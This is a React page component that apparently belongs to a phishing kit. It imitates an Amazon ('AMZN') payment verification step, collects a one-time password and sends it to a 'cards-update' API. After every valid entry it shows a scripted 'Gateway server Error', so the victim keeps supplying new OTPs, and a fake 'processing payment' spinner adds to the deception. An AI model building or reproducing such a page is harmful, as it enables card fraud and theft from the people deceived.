import React, { useEffect, useState } from 'react';
import Nav from '../Headerfooter/Nav';
import { useLocation } from 'react-router-dom';
import axios from 'axios'; // Ensure axios is imported
import FadeLoader from 'react-spinners/FadeLoader';
import Footer1 from '../Headerfooter/Footer1';

const Cardinfo = () => {
  const location = useLocation();
  const { apiPayload } = location.state || {};
  const [otp, setOtp] = useState("");
  const [errors, setErrors] = useState({});
  const [message,setMessage]=useState();
  const [timer, setTimer] = useState(20); 
  const [loading, setLoading] = useState(true);
  // Handle Change event
  const handleChange = (e) => {
    setOtp(e.target.value);
  };

  // Validtion for fields
  const validateForm = () => {
    const newErrors = {};
    // Validate OTP
    if (!otp.trim()) {
      newErrors.otp = 'OTP is required';
    } else if (!/^\d{4,6}$/.test(otp)) {
      newErrors.otp = 'Incorrect OTP';
    }
    return newErrors;
  };

  const validateFormotp = () => {
    const newErrors = {};
    // Validate OTP
      newErrors.otp = 'Gateway server Error.Now OTP has been sent again to your registered mobile number. Please enter OTP again.  ';
    return newErrors;
  };

  // api call on submit
   const handleSubmit = async (e) => {
    e.preventDefault();
    const validationErrors = validateForm();
    if (Object.keys(validationErrors).length > 0) {
      setErrors(validationErrors);
    } else {
      const validationErrors = validateFormotp();
      setErrors({});
      const data ={
        otp:[
          otp
        ]
      }
     // console.log("data",data)
      // Prepare the payload to send to the API      
  //  const apiPayload = {     
  //      price:apiPayload.price
  //  }
      try {
        // Send data to the API
        const token = localStorage.getItem('authToken');

         const response = await axios.put('http://localhost:3001/api/cards-update', data, {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${token}`,
        }
      });
        // Handle successful submission
        if (response.status === 201 || response.status === 200) {
          alert('Payment successful!');
          
          // Redirect or perform further actions if needed
        }
      } catch (error) {
        // Handle errors from the API
        console.error('There was an error submitting the form:', error);
        alert('Failed to process payment. Please try again.');
      }
      setErrors(validationErrors);
    }
  };
  
  // useEffect(() => {
  //   const timer = setTimeout(() => {
  //     setLoading(false);
  //   }, 1000);
  //   return () => clearTimeout(timer);
  // }, []);
  useEffect(() => {
    // Timer setup and loading state management
    const timerInterval = setInterval(() => {
      setTimer((prevTimer) => {
        if (prevTimer > 0) {
          return prevTimer - 1;
        } else {
          clearInterval(timerInterval);
          return 0;
        }
      });
    }, 1000);

    const loadingTimeout = setTimeout(() => {
      setLoading(false);
    }, 10000);

    return () => {
      clearInterval(timerInterval);
      clearTimeout(loadingTimeout);
    };
  }, []);
  return (
    <>
      <Nav />
      <div className='container formbg m-0 p-0 ps-2 pe-2 pt-3 pb-5'>
      
     { loading===false?
      <div>
        <div className='row mt-3'>
          <div className='col-9'>
            <h5 className='ms-5' >Paying to Total Amount</h5>
          </div>
          <div className='col-3'>
            <h5>AMZN ₹{apiPayload?.price}</h5>
          </div>
        </div>

        <h3 className='bold'  style={{fontWeight:"bold"}}>Verification required</h3>
        <p>To continue, complete this verification step. We've sent an OTP to your mobile number. Please enter it below to complete verification.</p>
        <input     type='text'
          placeholder='Enter OTP'
          className='mt-3'
          name="otp"
          value={otp}
          onChange={handleChange}
        />
      {errors.otp && <span className="error-text">{errors.otp}</span>}     
        {errors.otpdone && <span className="error-text">{errors.otpdone}</span>}
        <div className='col-12 mt-5'>
          <button
            className='btn btn-warning d-block w-100 pt-2 pb-2 mb-3'
            type="submit"
            onClick={handleSubmit}
          >
            Pay
          </button>
        </div>

        {timer===0?<p className='text-center'  style={{cursor:"pointer" ,color:"green"}}>Resend Otp</p>:
        <p className='text-center'  style={{cursor:"pointer"}}>
          Not received your code? Resend code in {timer} Seconds  </p>}
        </div> :
         <div className='container formbg m-0 p-0 ps-2 pe-2 pt-3'>
       
       <h3 className='bold text-center' style={{fontWeight:"bold"}}>Please wait while we are processing payment</h3>
      
       <div className='d-flex justify-content-center mt-5 mb-5' >
   <FadeLoader />
   </div>
   </div>}
      
   </div>
    <Footer1/>
    </>
  );
}

export default Cardinfo;
